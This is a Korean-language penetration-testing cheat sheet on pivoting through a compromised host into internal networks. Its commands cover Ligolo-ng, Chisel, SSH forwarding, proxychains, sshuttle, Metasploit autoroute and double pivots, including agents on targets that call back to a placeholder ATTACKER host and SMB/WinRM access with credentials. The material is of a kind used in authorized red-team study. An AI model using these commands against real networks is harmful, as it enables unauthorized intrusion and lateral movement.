# Pivoting / Tunneling

확보한 거점을 경유해서, 직접 닿지 않는 다른 내부 세그먼트로 트래픽을 흘려보내는 작업이다. tunneling 이 작동해야 내부망 대역에 접근할 수 있다.

---

## Ligolo-ng

가장 편리한 tunneling 도구. TUN 인터페이스 기반으로 별도 proxy 없이 직접 통신 가능.

### 공격자 (Proxy Server)

```bash
# TUN 인터페이스 생성
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# Proxy 서버 실행
./proxy -selfcert -laddr 0.0.0.0:11601

# session 선택 후 라우팅 추가
>> session
>> ifconfig  # 내부 네트워크 대역 확인

# 라우팅 추가 (별도 터미널)
sudo ip route add 10.0.0.0/24 dev ligolo

# tunnel 시작
>> start
```

### target (Agent)

```bash
# Linux
./agent -connect ATTACKER:11601 -ignore-cert

# Windows
.\agent.exe -connect ATTACKER:11601 -ignore-cert
```

### listener (Reverse Connection)

```bash
# ligolo session에서 listener 추가
>> listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp

# 내부 호스트에서 Pivot 호스트의 4444로 연결하면
# 공격자의 4444로 forward 됨
```

---

## Chisel

HTTP/SOCKS5 tunneling. 단일 binary, cross-platform.

### SOCKS proxy

```bash
# 공격자 (서버)
./chisel server -p 8080 --reverse

# target (클라이언트)
./chisel client ATTACKER:8080 R:socks

# proxychains 설정 (/etc/proxychains4.conf)
# socks5 127.0.0.1 1080

# proxychains 사용
proxychains nmap -sT -Pn -p 445 10.0.0.5
proxychains nxc smb 10.0.0.5
```

### Port Forwarding

```bash
# 원격 port forwarding
./chisel client ATTACKER:8080 R:8888:10.0.0.5:80
# → 공격자의 localhost:8888 = 내부 10.0.0.5:80

# 로컬 port forwarding
./chisel client ATTACKER:8080 8888:10.0.0.5:80
# → target의 localhost:8888 = 내부 10.0.0.5:80
```

---

## SSH tunneling

```bash
# Local Port Forwarding
ssh -L 8080:INTERNAL:80 user@PIVOT
# 접근: localhost:8080 → INTERNAL:80

# Dynamic Port Forwarding (SOCKS)
ssh -D 1080 user@PIVOT
# proxychains socks5 127.0.0.1 1080

# Remote Port Forwarding
ssh -R 4444:localhost:4444 user@PIVOT
# PIVOT의 4444 → 공격자의 4444

# 다중 홉
ssh -J user@PIVOT1 user@PIVOT2
ssh -J user@PIVOT1,user@PIVOT2 user@INTERNAL

# SSH tunnel 백그라운드
ssh -f -N -D 1080 user@PIVOT
```

---

## proxychains

```bash
# /etc/proxychains4.conf 설정
[ProxyList]
socks5 127.0.0.1 1080

# 사용
proxychains nmap -sT -Pn -p 22,80,445 INTERNAL_TARGET
proxychains nxc smb INTERNAL_TARGET -u user -p pass
proxychains evil-winrm -i INTERNAL_TARGET -u admin -p pass

# 주의: proxychains는 TCP만 지원 (ICMP/UDP 불가)
# nmap 사용 시 -sT (TCP Connect) 필수
```

---

## sshuttle

```bash
# Python 기반 VPN-like tunnel (SSH 통해)
sshuttle -r user@PIVOT 10.0.0.0/24

# SSH 키
sshuttle -r user@PIVOT 10.0.0.0/24 --ssh-cmd 'ssh -i id_rsa'

# DNS 포함
sshuttle --dns -r user@PIVOT 10.0.0.0/24
```

---

## Metasploit Pivoting

```bash
# Meterpreter session에서
meterpreter> run autoroute -s 10.0.0.0/24
meterpreter> background

# SOCKS proxy
msf> use auxiliary/server/socks_proxy
msf> set SRVPORT 1080
msf> run -j

# portfwd
meterpreter> portfwd add -l 8080 -p 80 -r INTERNAL_TARGET
```

---

## 더블 Pivot

```text
공격자 → PIVOT1 (DMZ) → PIVOT2 (내부) → TARGET
```

```bash
# 1단계: 공격자 → PIVOT1
chisel server -p 8080 --reverse  # 공격자
chisel client ATTACKER:8080 R:socks  # PIVOT1

# 2단계: PIVOT1 → PIVOT2
# PIVOT1에서 chisel server 실행
chisel server -p 9090 --reverse  # PIVOT1
chisel client PIVOT1:9090 R:1081:socks  # PIVOT2

# proxychains 체인 설정
# /etc/proxychains4.conf
[ProxyList]
socks5 127.0.0.1 1080
socks5 127.0.0.1 1081
```
